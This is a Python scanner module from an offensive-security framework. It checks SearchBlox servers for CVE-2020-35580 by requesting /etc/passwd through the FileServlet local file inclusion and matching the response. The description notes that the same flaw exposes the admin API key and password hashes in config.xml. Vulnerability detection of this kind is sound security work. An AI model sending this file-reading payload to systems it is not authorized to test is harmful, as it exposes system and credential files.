#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SearchBlox prior to version 9."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SearchBlox <9.2.2 - Local File Inclusion Detection',
        'description': 'SearchBlox prior to version 9.2.2 is susceptible to local file inclusion in FileServlet that allows remote, unauthenticated users to read arbitrary files from the operating system via a /searchblox/servlet/FileServlet?col=url= request. Additionally, this may be used to read the contents of the SearchBlox configuration file (e.g., searchblox/WEB-INF/config.xml), which contains both the Super Admin API key and the base64 encoded SHA1 password hashes of other SearchBlox users.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'lfi', 'searchblox', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://hateshape.github.io/general/2021/05/11/CVE-2020-35580.html',
            'https://developer.searchblox.com/docs/getting-started-with-searchblox',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-35580',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-35580',
    }

    def run(self):
        r = self.http_request(method="GET", path='/searchblox/servlet/FileServlet?col=9&url=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="SearchBlox <9.2.2 - Local File Inclusion detected",
                path='/searchblox/servlet/FileServlet?col=9&url=/etc/passwd',
            )
            return True
        return False

